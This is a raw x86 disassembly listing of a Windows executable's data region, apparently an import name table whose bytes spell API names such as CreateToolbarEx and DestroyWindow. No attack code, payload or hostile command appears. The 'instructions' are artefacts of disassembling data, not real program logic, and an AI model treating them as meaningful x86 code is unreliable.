  42589f:	add    BYTE PTR [eax],al
  4258a1:	add    BYTE PTR [eax],al
  4258a3:	add    BYTE PTR [edx+0x66],bh
  4258a6:	add    al,BYTE PTR [eax]
  4258a8:	mov    ah,BYTE PTR [esi+0x2]
  4258ab:	add    BYTE PTR [eax-0x4bfffd9a],ah
  4258b1:	data16 add al,BYTE PTR [eax]
  4258b4:	shl    BYTE PTR [esi+0x2],0x0
  4258b8:	shl    BYTE PTR [esi+0x2],1
  4258bb:	add    ah,ah
  4258bd:	data16 add al,BYTE PTR [eax]
  4258c0:	cli    
  4258c1:	data16 add al,BYTE PTR [eax]
  4258c4:	or     ah,BYTE PTR [edi+0x2]
  4258c7:	add    BYTE PTR [edi+eiz*2],dl
  4258ca:	add    al,BYTE PTR [eax]
  4258cc:	add    al,BYTE PTR es:[bx+si]
  4258d0:	xor    BYTE PTR [edi+0x2],ah
  4258d3:	add    BYTE PTR [esi+0x67],al
  4258d6:	add    al,BYTE PTR [eax]
  4258d8:	push   edx
  4258d9:	add    al,BYTE PTR [bx+si]
  4258dc:	pop    esp
  4258dd:	add    al,BYTE PTR [bx+si]
  4258e0:	data16 add al,BYTE PTR [bx+si]
  4258e4:	js     0x42594d
  4258e6:	add    al,BYTE PTR [eax]
  4258e8:	test   BYTE PTR [edi+0x2],ah
  4258eb:	add    BYTE PTR [eax-0x57fffd99],bl
  4258f1:	add    al,BYTE PTR [bx+si]
  4258f4:	mov    dh,0x67
  4258f6:	add    al,BYTE PTR [eax]
  4258f8:	retf   0x267
  4258fb:	add    dh,dl
  4258fd:	add    al,BYTE PTR [bx+si]
  425900:	jmp    0x267:0xf4000267
  425907:	add    BYTE PTR [edx],al
  425909:	push   0x680c0002
  42590e:	add    al,BYTE PTR [eax]
  425910:	sbb    BYTE PTR [eax+0x2],ch
  425913:	add    BYTE PTR [eax+ebp*2],ch
  425916:	add    al,BYTE PTR [eax]
  425918:	ss push 0x684c0002
  42591e:	add    al,BYTE PTR [eax]
  425920:	pop    eax
  425921:	push   0x68680002
  425926:	add    al,BYTE PTR [eax]
  425928:	jp     0x425992
  42592a:	add    al,BYTE PTR [eax]
  42592c:	mov    BYTE PTR [eax+0x2],ch
  42592f:	add    BYTE PTR [eax-0x5bfffd98],bl
  425935:	push   0x68b00002
  42593a:	add    al,BYTE PTR [eax]
  42593c:	les    ebp,FWORD PTR [eax+0x2]
  42593f:	add    dh,cl
  425941:	push   0x68e60002
  425946:	add    al,BYTE PTR [eax]
  425948:	(bad)  
  425949:	push   0x690a0002
  42594e:	add    al,BYTE PTR [eax]
  425950:	sbb    ch,BYTE PTR [ecx+0x2]
  425953:	add    BYTE PTR [eax],al
  425955:	add    BYTE PTR [eax],al
  425957:	add    BYTE PTR [edi+0x0],dl
  42595a:	dec    ecx
  42595b:	outs   dx,BYTE PTR ds:[esi]
  42595c:	imul   esi,DWORD PTR [ebx+eax*2+0x6f],0x6e6f6d6d
  425964:	inc    ebx
  425965:	outs   dx,DWORD PTR ds:[esi]
  425966:	outs   dx,BYTE PTR ds:[esi]
  425967:	je     0x4259db
  425969:	outs   dx,DWORD PTR ds:[esi]
  42596a:	ins    BYTE PTR es:[edi],dx
  42596b:	jae    0x4259b2
  42596d:	js     0x42596f
  42596f:	add    BYTE PTR [eax+eax*1+0x49],cl
  425973:	ins    DWORD PTR es:[edi],dx
  425974:	popa   
  425975:	addr16 gs dec esp
  425978:	imul   esi,DWORD PTR [ebx+0x74],0x6d65525f
  42597f:	outs   dx,DWORD PTR ds:[esi]
  425980:	jbe    0x4259e7
  425982:	add    BYTE PTR [eax],al
  425984:	push   ss
  425985:	add    BYTE PTR [ebx+0x72],al
  425988:	gs popa 
  42598a:	je     0x4259f1
  42598c:	push   esp
  42598d:	outs   dx,DWORD PTR ds:[esi]
  42598e:	outs   dx,DWORD PTR ds:[esi]
  42598f:	ins    BYTE PTR es:[edi],dx
  425990:	bound  esp,QWORD PTR [ecx+0x72]
  425993:	inc    ebp
  425994:	js     0x425996
  425996:	add    BYTE PTR ds:[ecx+0x6d],cl
  42599a:	popa   
  42599b:	addr16 gs dec esp
  42599e:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  4259a5:	dec    ecx
  4259a6:	arpl   WORD PTR [edi+0x6e],bp
  4259a9:	add    BYTE PTR ds:0x65724300,dl
  4259af:	popa   
  4259b0:	je     0x425a17
  4259b2:	push   ebx
  4259b3:	je     0x425a16
  4259b5:	je     0x425a2c
  4259b7:	jae    0x425a10
  4259b9:	imul   ebp,DWORD PTR [esi+0x64],0x57776f
  4259c0:	pop    ss
  4259c1:	add    BYTE PTR [ebp+eiz*2+0x73],al
  4259c5:	je     0x425a39
  4259c7:	outs   dx,DWORD PTR ds:[esi]
  4259c8:	jns    0x425a1a
  4259ca:	jb     0x425a3b
  4259cc:	jo     0x425a33
  4259ce:	jb     0x425a44
  4259d0:	jns    0x425a25
  4259d2:	push   0x50746565
  4259d7:	popa   
  4259d8:	add    BYTE PTR gs:[bx+si],al
  4259dc:	inc    ebx
  4259dd:	dec    edi
  4259de:	dec    ebp
  4259df:	inc    ebx
  4259e0:	push   esp
  4259e1:	dec    esp
  4259e2:	xor    esi,DWORD PTR [edx]
  4259e4:	cs fs ins BYTE PTR es:[edi],dx
  4259e7:	ins    BYTE PTR es:[edi],dx
  4259e8:	add    BYTE PTR [eax],al
  4259ea:	mov    cl,0x2
  4259ec:	push   esi
  4259ed:	imul   ecx,DWORD PTR [ebx+0x65],0x79
  4259f1:	push   ebx
  4259f2:	arpl   WORD PTR [ecx+0x6e],sp
  4259f5:	push   edi
  4259f6:	add    BYTE PTR [eax],al
  4259f8:	push   ecx
  4259f9:	add    dl,BYTE PTR [ebx+0x65]
  4259fc:	je     0x425a4e
  4259fe:	popa   
  4259ff:	jb     0x425a66
  425a01:	outs   dx,BYTE PTR ds:[esi]
  425a02:	je     0x425a04
  425a04:	sgdtd  [edi+0x65]
  425a08:	je     0x425a4e
  425a0a:	ins    BYTE PTR es:[edi],dx
  425a0b:	addr16 dec ecx
  425a0d:	je     0x425a74
  425a0f:	ins    DWORD PTR es:[edi],dx
  425a10:	add    BYTE PTR [eax],al
  425a12:	scas   eax,DWORD PTR es:[edi]
  425a13:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  425a17:	fs dec ecx
  425a19:	arpl   WORD PTR [edi+0x6e],bp
  425a1c:	inc    ecx
  425a1d:	add    BYTE PTR [ebx+0x2],bh
  425a20:	push   ebx
  425a21:	push   0x7543776f
  425a26:	jb     0x425a9b
  425a28:	outs   dx,DWORD PTR ds:[esi]
  425a29:	jb     0x425a2b
  425a2b:	add    BYTE PTR ds:0x67655202,al
  425a31:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  425a38:	popa   
  425a39:	jae    0x425aae
  425a3b:	push   edi
  425a3c:	add    BYTE PTR [eax],al
  425a3e:	xchg   esp,eax
  425a3f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  425a43:	je     0x425ab7
  425a45:	outs   dx,DWORD PTR ds:[esi]
  425a46:	jns    0x425a8b
  425a48:	popa   
  425a49:	jb     0x425ab0
  425a4b:	je     0x425a4d
  425a4d:	add    cl,bl
  425a4f:	add    DWORD PTR [ebp+0x6f],ecx
  425a52:	outs   dx,BYTE PTR ds:[esi]
  425a53:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  425a5b:	push   edx
  425a5c:	arpl   WORD PTR gs:[eax+eax*1-0x60],si
  425a61:	add    DWORD PTR [ecx+0x73],ecx
  425a64:	push   edi
  425a65:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  425a6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425a6d:	add    DWORD PTR [ecx+0x73],ecx
  425a70:	pop    edx
  425a71:	outs   dx,DWORD PTR ds:[esi]
  425a72:	outs   dx,DWORD PTR ds:[esi]
  425a73:	ins    DWORD PTR es:[edi],dx
  425a74:	gs add BYTE PTR fs:[eax],al
  425a78:	aaa    
  425a79:	add    BYTE PTR [ebx+0x68],al
  425a7c:	popa   
  425a7d:	jb     0x425ad4
  425a7f:	jo     0x425af1
  425a81:	gs jb  0x425ac6
  425a84:	jne    0x425aec
  425a86:	inc    cx
  425a88:	add    BYTE PTR [eax],al
  425a8a:	inc    ecx
  425a8b:	add    dl,BYTE PTR [ebx+0x65]
  425a8e:	je     0x425ad6
  425a90:	outs   dx,DWORD PTR ds:[esi]
  425a91:	arpl   WORD PTR [ebp+0x73],si
  425a94:	add    BYTE PTR [eax],al
  425a96:	cwde   
  425a97:	add    DWORD PTR [ecx+0x73],ecx
  425a9a:	inc    esp
  425a9b:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  425aa2:	jae    0x425b17
  425aa4:	popa   
  425aa5:	addr16 gs push edi
  425aa8:	add    BYTE PTR [eax],al
  425aaa:	loop   0x425aac
  425aac:	inc    esi
  425aad:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  425ab4:	outs   dx,DWORD PTR ds:[esi]
  425ab5:	ja     0x425afc
  425ab7:	js     0x425afa
  425ab9:	add    bl,bl
  425abb:	add    DWORD PTR [ebp+0x6f],ecx
  425abe:	jbe    0x425b25
  425ac0:	push   edi
  425ac1:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  425ac8:	mov    al,BYTE PTR [edx]
  425aca:	push   esp
  425acb:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  425ad3:	ja     0x425b48
  425ad5:	add    BYTE PTR [ebx+0x61724400],dh
  425adb:	ja     0x425b26
  425add:	arpl   WORD PTR [edi+0x6e],bp
  425ae0:	add    BYTE PTR [eax],al
  425ae2:	xchg   edi,eax
  425ae3:	add    BYTE PTR [ebp+eiz*2+0x73],al
  425ae7:	je     0x425b5b
  425ae9:	outs   dx,DWORD PTR ds:[esi]
  425aea:	jns    0x425b39
  425aec:	outs   dx,BYTE PTR gs:[esi]
  425aee:	jne    0x425af0
  425af0:	sbb    BYTE PTR [ecx],al
  425af2:	inc    edi
  425af3:	gs je  0x425b3f
  425af6:	arpl   WORD PTR [edi+0x6e],bp
  425af9:	dec    ecx
  425afa:	outs   dx,BYTE PTR ds:[esi]
  425afb:	outs   dx,WORD PTR ds:[esi]
  425afd:	add    ch,bl
  425aff:	add    BYTE PTR [ebp+0x71],al
  425b02:	jne    0x425b65
  425b04:	ins    BYTE PTR es:[edi],dx
  425b05:	push   edx
  425b06:	arpl   WORD PTR gs:[eax+eax*1+0x10],si
  425b0b:	add    DWORD PTR [edi+0x65],eax
  425b0e:	je     0x425b54
  425b10:	ins    BYTE PTR es:[edi],dx
  425b11:	addr16 dec ecx
  425b13:	je     0x425b7a
  425b15:	ins    DWORD PTR es:[edi],dx
  425b16:	dec    ecx
  425b17:	outs   dx,BYTE PTR ds:[esi]
  425b18:	je     0x425b1a
  425b1a:	rol    DWORD PTR [edx],0x77
  425b1d:	jbe    0x425b92
  425b1f:	jo     0x425b93
  425b21:	imul   ebp,DWORD PTR [esi+0x74],0x4166
  425b28:	inc    ebp
  425b29:	add    DWORD PTR [edi+0x65],eax
  425b2c:	je     0x425b7e
  425b2e:	popa   
  425b2f:	jb     0x425b96
  425b31:	outs   dx,BYTE PTR ds:[esi]
  425b32:	je     0x425b34
  425b34:	sti    
  425b35:	add    DWORD PTR [eax+0x74],edx
  425b38:	dec    ecx
  425b39:	outs   dx,BYTE PTR ds:[esi]
  425b3a:	push   edx
  425b3b:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  425b40:	pop    edi
  425b41:	add    dl,BYTE PTR [ebx+0x65]
  425b44:	je     0x425b99
  425b46:	jns    0x425bbb
  425b48:	inc    ebx
  425b49:	outs   dx,DWORD PTR ds:[esi]
  425b4a:	ins    BYTE PTR es:[edi],dx
  425b4b:	outs   dx,DWORD PTR ds:[esi]
  425b4c:	jb     0x425bc1
  425b4e:	add    BYTE PTR [eax],al
  425b50:	hlt    
  425b51:	add    BYTE PTR [edi+0x65],al
  425b54:	je     0x425b99
  425b56:	ins    BYTE PTR es:[edi],dx
  425b57:	popa   
  425b58:	jae    0x425bcd
  425b5a:	dec    ecx
  425b5b:	outs   dx,BYTE PTR ds:[esi]
  425b5c:	outs   dx,WORD PTR ds:[esi]
  425b5e:	inc    ecx
  425b5f:	add    BYTE PTR [edx],cl
  425b61:	add    dl,BYTE PTR [edx+0x65]
  425b64:	imul   esi,DWORD PTR [bp+di+0x74],0x6f487265
  425b6c:	je     0x425bb9
  425b6e:	gs jns 0x425b71
  425b71:	add    BYTE PTR [esi+0x1],dl
  425b74:	inc    edi
  425b75:	gs je  0x425bcb
  425b78:	arpl   WORD PTR [edx+0x6f],si
  425b7b:	ins    BYTE PTR es:[edi],dx
  425b7c:	ins    BYTE PTR es:[edi],dx
  425b7d:	push   edx
  425b7e:	popa   
  425b7f:	outs   dx,BYTE PTR ds:[esi]
  425b80:	add    BYTE PTR gs:[bx+si],al
  425b84:	test   al,0x1
  425b86:	dec    esp
  425b87:	outs   dx,DWORD PTR ds:[esi]
  425b88:	popa   
  425b89:	fs inc ecx
  425b8b:	arpl   WORD PTR [ebx+0x65],sp
  425b8e:	ins    BYTE PTR es:[edi],dx
  425b8f:	gs jb  0x425bf3
  425b92:	je     0x425c03
  425b94:	jb     0x425c09
  425b96:	push   edi
  425b97:	add    BYTE PTR [ecx+eax*1+0x47],dl
  425b9b:	gs je  0x425bf1
  425b9e:	arpl   WORD PTR [edx+0x6f],si
  425ba1:	ins    BYTE PTR es:[edi],dx
  425ba2:	ins    BYTE PTR es:[edi],dx
  425ba3:	dec    ecx
  425ba4:	outs   dx,BYTE PTR ds:[esi]
  425ba5:	outs   dx,WORD PTR ds:[esi]
  425ba7:	add    BYTE PTR [edx],ch
  425ba9:	add    BYTE PTR [ebx+0x68],al
  425bac:	popa   
  425bad:	jb     0x425bfd
  425baf:	gs js  0x425c26
  425bb2:	inc    ecx
  425bb3:	add    BYTE PTR [ecx],dl
  425bb5:	add    DWORD PTR [edi+0x65],eax
  425bb8:	je     0x425bfe
  425bba:	ins    BYTE PTR es:[edi],dx
  425bbb:	addr16 dec ecx
  425bbd:	je     0x425c24
  425bbf:	ins    DWORD PTR es:[edi],dx
  425bc0:	push   esp
  425bc1:	gs js  0x425c38
  425bc4:	inc    ecx
  425bc5:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  425bcc:	outs   dx,DWORD PTR ds:[esi]
  425bcd:	outs   dx,BYTE PTR ds:[esi]
  425bce:	imul   esp,DWORD PTR [ebx+0x0],0x53027a00
  425bd5:	push   0x6143776f
  425bda:	jb     0x425c41
  425bdc:	je     0x425bde
  425bde:	cmp    eax,0x74655302
  425be3:	inc    esp
  425be4:	ins    BYTE PTR es:[edi],dx
  425be5:	addr16 dec ecx
  425be7:	je     0x425c4e
  425be9:	ins    DWORD PTR es:[edi],dx
  425bea:	dec    ecx
  425beb:	outs   dx,BYTE PTR ds:[esi]
  425bec:	je     0x425bee
  425bee:	add    DWORD PTR [ecx],0x49
  425bf1:	outs   dx,BYTE PTR ds:[esi]
  425bf2:	jae    0x425c59
  425bf4:	jb     0x425c6a
  425bf6:	dec    ebp
  425bf7:	outs   dx,BYTE PTR gs:[esi]
  425bf9:	jne    0x425c3c
  425bfb:	add    BYTE PTR [ebx+0x0],ah
  425bfe:	inc    ebx
  425bff:	jb     0x425c66
  425c01:	popa   
  425c02:	je     0x425c69
  425c04:	push   edi
  425c05:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  425c0c:	push   edi
  425c0d:	add    al,dl
  425c0f:	add    DWORD PTR [ebp+0x65],ecx
  425c12:	jae    0x425c87
  425c14:	popa   
  425c15:	addr16 gs inc edx
  425c18:	outs   dx,DWORD PTR ds:[esi]
  425c19:	js     0x425c60
  425c1b:	js     0x425c74
  425c1d:	add    BYTE PTR [ebx],ch
  425c1f:	add    dl,BYTE PTR [ebx+0x65]
  425c22:	outs   dx,BYTE PTR ds:[esi]
  425c23:	fs dec ebp
  425c25:	gs jae 0x425c9b
  425c28:	popa   
  425c29:	addr16 gs push edi
  425c2c:	add    BYTE PTR [eax],al
  425c2e:	jl     0x425c32
  425c30:	push   ebx
  425c31:	push   0x774f776f
  425c36:	outs   dx,BYTE PTR ds:[esi]
  425c37:	gs fs push eax
  425c3a:	outs   dx,DWORD PTR ds:[esi]
  425c3b:	jo     0x425cb2
  425c3d:	jo     0x425cb2
  425c3f:	add    BYTE PTR [ebp+0x0],cl
  425c42:	inc    ebx
  425c43:	outs   dx,DWORD PTR ds:[esi]
  425c44:	jo     0x425cbf
  425c46:	push   edx
  425c47:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  425c4c:	xchg   ebx,eax
  425c4d:	add    BYTE PTR [ebp+eiz*2+0x73],al
  425c51:	je     0x425cc5
  425c53:	outs   dx,DWORD PTR ds:[esi]
  425c54:	jns    0x425c97
  425c56:	arpl   WORD PTR [ebx+0x65],sp
  425c59:	ins    BYTE PTR es:[edi],dx
  425c5a:	gs jb  0x425cbe
  425c5d:	je     0x425cce
  425c5f:	jb     0x425cb5
  425c61:	popa   
  425c62:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  425c66:	pop    ebx
  425c67:	add    DWORD PTR [edi+0x65],eax
  425c6a:	je     0x425cbf
  425c6c:	jns    0x425ce1
  425c6e:	je     0x425cd5
  425c70:	ins    DWORD PTR es:[edi],dx
  425c71:	dec    ebp
  425c72:	outs   dx,BYTE PTR gs:[esi]
  425c74:	jne    0x425c76
  425c76:	ja     0x425c79
  425c78:	inc    edi
  425c79:	gs je  0x425cd3
  425c7c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  425c83:	js     0x425cf9
  425c85:	dec    esp
  425c86:	outs   dx,BYTE PTR gs:[esi]
  425c88:	addr16 je 0x425cf3
  425c8b:	push   edi
  425c8c:	add    BYTE PTR [eax],al
  425c8e:	jmp    0x65b2ab94
  425c93:	outs   dx,BYTE PTR ds:[esi]
  425c94:	dec    ecx
  425c95:	outs   dx,BYTE PTR ds:[esi]
  425c96:	jo     0x425d0d
  425c98:	je     0x425cde
  425c9a:	gs jae 0x425d08
  425c9d:	je     0x425d0e
  425c9f:	jo     0x425ca1
  425ca1:	add    bh,dl
  425ca3:	add    DWORD PTR [ebp+0x6f],ecx
  425ca6:	imul   esp,DWORD PTR fs:[esi+0x79],0x756e654d
  425cae:	push   edi
  425caf:	add    BYTE PTR [eax+0x61725402],dl
  425cb5:	arpl   WORD PTR [ebx+0x50],bp
  425cb8:	outs   dx,DWORD PTR ds:[esi]
  425cb9:	jo     0x425d30
  425cbb:	jo     0x425d0a
  425cbd:	outs   dx,BYTE PTR gs:[esi]
  425cbf:	jne    0x425cc1
  425cc1:	add    BYTE PTR [edi],cl
  425cc3:	add    BYTE PTR [edx+0x72],al
  425cc6:	imul   ebp,DWORD PTR [esi+0x67],0x646e6957
  425ccd:	outs   dx,DWORD PTR ds:[esi]
  425cce:	ja     0x425d24
  425cd0:	outs   dx,DWORD PTR ds:[esi]
  425cd1:	push   esp
  425cd2:	outs   dx,DWORD PTR ds:[esi]
  425cd3:	jo     0x425cd5
  425cd5:	add    BYTE PTR [edx+eax*1],al
  425cd8:	push   edx
  425cd9:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  425ce2:	popa   
  425ce3:	jae    0x425d58
  425ce5:	inc    ebp
  425ce6:	js     0x425d3f
  425ce8:	add    BYTE PTR [eax],al
  425cea:	outs   dx,BYTE PTR ds:[esi]
  425ceb:	add    dl,BYTE PTR [ebx+0x65]
  425cee:	je     0x425d47
  425cf0:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  425cf7:	outs   dx,BYTE PTR ds:[esi]
  425cf8:	addr16 push edi
  425cfa:	add    BYTE PTR [eax],al
  425cfc:	xchg   DWORD PTR [eax],eax
  425cfe:	inc    esp
  425cff:	gs inc sp
  425d02:	ins    BYTE PTR es:[edi],dx
  425d03:	addr16 push eax
  425d05:	jb     0x425d76
  425d07:	arpl   WORD PTR [ecx+0x0],ax
  425d0a:	cmp    al,BYTE PTR [eax]
  425d0c:	inc    ebx
  425d0d:	push   0x446b6365
  425d12:	ins    BYTE PTR es:[edi],dx
  425d13:	addr16 inc edx
  425d15:	jne    0x425d8b
  425d17:	je     0x425d88
  425d19:	outs   dx,BYTE PTR ds:[esi]
  425d1a:	add    BYTE PTR [eax],al
  425d1c:	stos   BYTE PTR es:[edi],al
  425d1d:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  425d21:	fs inc edx
  425d23:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xc4005770
  425d2b:	add    DWORD PTR [ebp+0x61],ecx
  425d2e:	jo     0x425d74
  425d30:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  425d37:	arpl   WORD PTR [eax+eax*1-0x59],si
  425d3b:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  425d3f:	fs inc ecx
  425d41:	arpl   WORD PTR [ebx+0x65],sp
  425d44:	ins    BYTE PTR es:[edi],dx
  425d45:	gs jb  0x425da9
  425d48:	je     0x425db9
  425d4a:	jb     0x425dbf
  425d4c:	inc    ecx
  425d4d:	add    BYTE PTR [eax],ch
  425d4f:	add    DWORD PTR [edi+0x65],eax
  425d52:	je     0x425da0
  425d54:	popa   
  425d55:	jae    0x425dcb
  425d57:	inc    ecx
  425d58:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  425d5c:	gs push eax
  425d5e:	outs   dx,DWORD PTR ds:[esi]
  425d5f:	jo     0x425dd6
  425d61:	jo     0x425d63
  425d63:	add    BYTE PTR [edx+eax*1+0x53],dh
  425d67:	gs je  0x425dc1
  425d6a:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  425d71:	js     0x425de7
  425d73:	push   edi
  425d74:	add    BYTE PTR [eax],al
  425d76:	xor    al,BYTE PTR [edx]
  425d78:	push   ebx
  425d79:	gs je  0x425dbf
  425d7c:	popa   
  425d7d:	jb     0x425de4
  425d7f:	je     0x425dd1
  425d81:	outs   dx,DWORD PTR ds:[esi]
  425d82:	jae    0x425d84
  425d84:	icebp  
  425d85:	add    DWORD PTR [eax+0x6f],edx
  425d88:	jae    0x425dfe
  425d8a:	dec    ebp
  425d8b:	gs jae 0x425e01
  425d8e:	popa   
  425d8f:	addr16 gs inc ecx
  425d92:	add    BYTE PTR [eax],al
  425d94:	mov    ebx,0x616f4c01
  425d99:	fs push ebx
  425d9b:	je     0x425e0f
  425d9d:	imul   ebp,DWORD PTR [esi+0x67],0x570041
  425da4:	inc    ebx
  425da5:	jb     0x425e0c
  425da7:	popa   
  425da8:	je     0x425e0f
  425daa:	inc    esp
  425dab:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  425db2:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  425dba:	jb     0x425e1d
  425dbc:	ins    DWORD PTR es:[edi],dx
  425dbd:	push   edi
  425dbe:	add    BYTE PTR [eax],al
  425dc0:	mov    ah,0x0
  425dc2:	inc    esp
  425dc3:	jb     0x425e26
  425dc5:	ja     0x425e10
  425dc7:	arpl   WORD PTR [edi+0x6e],bp
  425dca:	inc    ebp
  425dcb:	js     0x425dcd
  425dcd:	add    BYTE PTR [eax+eax*1+0x77617244],bh
  425dd4:	push   esp
  425dd5:	gs js  0x425e4c
  425dd8:	push   edi
  425dd9:	add    BYTE PTR [edx+0x57734901],ah
  425ddf:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  425de6:	imul   esp,DWORD PTR [ebx+0x6f],0xc2006564
  425ded:	add    dh,BYTE PTR [edi+0x76]
  425df0:	jae    0x425e62
  425df2:	jb     0x425e5d
  425df4:	outs   dx,BYTE PTR ds:[esi]
  425df5:	je     0x425e5d
  425df7:	push   edi
  425df8:	add    BYTE PTR [eax],al
  425dfa:	push   edi
  425dfb:	add    dl,BYTE PTR [ebx+0x65]
  425dfe:	je     0x425e50
  425e00:	jb     0x425e71
  425e02:	jo     0x425e5b
  425e04:	add    BYTE PTR [eax],al
  425e06:	xchg   ebx,eax
  425e07:	add    dl,BYTE PTR [edx+esi*2+0x61]
  425e0b:	outs   dx,BYTE PTR ds:[esi]
  425e0c:	jae    0x425e7a
  425e0e:	popa   
  425e0f:	je     0x425e76
  425e11:	inc    ecx
  425e12:	arpl   WORD PTR [ebx+0x65],sp
  425e15:	ins    BYTE PTR es:[edi],dx
  425e16:	gs jb  0x425e7a
  425e19:	je     0x425e8a
  425e1b:	jb     0x425e5e
  425e1d:	add    BYTE PTR [ebx+0x1],ah
  425e20:	inc    edi
  425e21:	gs je  0x425e79
  425e24:	jo     0x425e8a
  425e26:	popa   
  425e27:	je     0x425e8e
  425e29:	push   edx
  425e2a:	arpl   WORD PTR gs:[eax+eax*1+0x7d],si
  425e2f:	add    DWORD PTR [eax+0x69],ecx
  425e32:	fs gs inc ebx
  425e35:	popa   
  425e36:	jb     0x425e9d
  425e38:	je     0x425e3a
  425e3a:	out    dx,eax
  425e3b:	add    DWORD PTR [eax+0x65],edx
  425e3e:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  425e43:	jae    0x425ea6
  425e45:	addr16 gs push edi
  425e48:	add    BYTE PTR [eax],al
  425e4a:	pop    ebx
  425e4b:	add    BYTE PTR [ebx+0x72],al
  425e4e:	gs popa 
  425e50:	je     0x425eb7
  425e52:	dec    ecx
  425e53:	arpl   WORD PTR [edi+0x6e],bp
  425e56:	inc    esi
  425e57:	jb     0x425ec8
  425e59:	ins    DWORD PTR es:[edi],dx
  425e5a:	push   edx
  425e5b:	gs jae 0x425ecd
  425e5e:	jne    0x425ed2
  425e60:	arpl   WORD PTR [ebp+0x0],sp
  425e63:	add    BYTE PTR ds:0x6e655302,ch
  425e69:	fs dec esi
  425e6b:	outs   dx,DWORD PTR ds:[esi]
  425e6c:	je     0x425ed7
  425e6e:	data16 jns 0x425ebe
  425e71:	gs jae 0x425ee7
  425e74:	popa   
  425e75:	addr16 gs push edi
  425e78:	add    BYTE PTR [eax],al
  425e7a:	mov    BYTE PTR [eax],al
  425e7c:	inc    esp
  425e7d:	gs inc sp
  425e80:	ins    BYTE PTR es:[edi],dx
  425e81:	addr16 push eax
  425e83:	jb     0x425ef4
  425e85:	arpl   WORD PTR [edi+0x0],dx
  425e88:	add    al,BYTE PTR [edx]
  425e8a:	push   edx
  425e8b:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  425e94:	popa   
  425e95:	jae    0x425f0a
  425e97:	inc    ecx
  425e98:	add    BYTE PTR [eax],al
  425e9a:	xchg   DWORD PTR [ecx],eax
  425e9c:	dec    ecx
  425e9d:	outs   dx,BYTE PTR ds:[esi]
  425e9e:	je     0x425f05
  425ea0:	jb     0x425f10
  425ea2:	popa   
  425ea3:	ins    BYTE PTR es:[edi],dx
  425ea4:	inc    edi
  425ea5:	gs je  0x425eff
  425ea8:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  425eaf:	js     0x425f25
  425eb1:	add    dh,ch
  425eb3:	add    DWORD PTR [eax+0x65],edx
  425eb6:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  425ebb:	jae    0x425f1e
  425ebd:	addr16 gs inc ecx
  425ec0:	add    BYTE PTR [eax],al
  425ec2:	pop    ecx
  425ec3:	add    DWORD PTR [edi+0x65],eax
  425ec6:	je     0x425f1b
  425ec8:	jns    0x425f3d
  425eca:	inc    ebx
  425ecb:	outs   dx,DWORD PTR ds:[esi]
  425ecc:	ins    BYTE PTR es:[edi],dx
  425ecd:	outs   dx,DWORD PTR ds:[esi]
  425ece:	jb     0x425ed0
  425ed0:	and    eax,0x74654701
  425ed5:	dec    ebx
  425ed6:	gs jns 0x425f3b
  425ed9:	outs   dx,DWORD PTR ds:[esi]
  425eda:	popa   
  425edb:	jb     0x425f41
  425edd:	dec    esp
  425ede:	popa   
  425edf:	jns    0x425f50
  425ee1:	jne    0x425f57
  425ee3:	dec    esi
  425ee4:	popa   
  425ee5:	ins    DWORD PTR es:[edi],dx
  425ee6:	gs push edi
  425ee8:	add    BYTE PTR [eax],al
  425eea:	jb     0x425eed
  425eec:	inc    edi
  425eed:	gs je  0x425f47
  425ef0:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  425ef7:	arpl   WORD PTR [eax+eax*1-0x6a],si
  425efb:	add    dl,BYTE PTR [edx+esi*2+0x61]
  425eff:	outs   dx,BYTE PTR ds:[esi]
  425f00:	jae    0x425f6e
  425f02:	popa   
  425f03:	je     0x425f6a
  425f05:	dec    ebp
  425f06:	gs jae 0x425f7c
  425f09:	popa   
  425f0a:	add    BYTE PTR gs:[bx+si],al
  425f0e:	push   0x74654701
  425f13:	push   edi
  425f14:	imul   ebp,DWORD PTR [esi+0x64],0x9500776f
  425f1b:	add    BYTE PTR [ebp+eiz*2+0x73],al
  425f1f:	je     0x425f93
  425f21:	outs   dx,DWORD PTR ds:[esi]
  425f22:	jns    0x425f67
  425f24:	jne    0x425f98
  425f26:	jae    0x425f97
  425f28:	jb     0x425f2a
  425f2a:	bound  eax,QWORD PTR [ecx]
  425f2c:	inc    edi
  425f2d:	gs je  0x425f84
  425f30:	outs   dx,DWORD PTR ds:[esi]
  425f31:	jo     0x425f8a
  425f33:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  425f3a:	xor    eax,DWORD PTR [ecx]
  425f3c:	inc    edi
  425f3d:	gs je  0x425f8d
  425f40:	outs   dx,BYTE PTR gs:[esi]
  425f42:	jne    0x425f8d
  425f44:	je     0x425fab
  425f46:	ins    DWORD PTR es:[edi],dx
  425f47:	dec    ecx
  425f48:	inc    esp
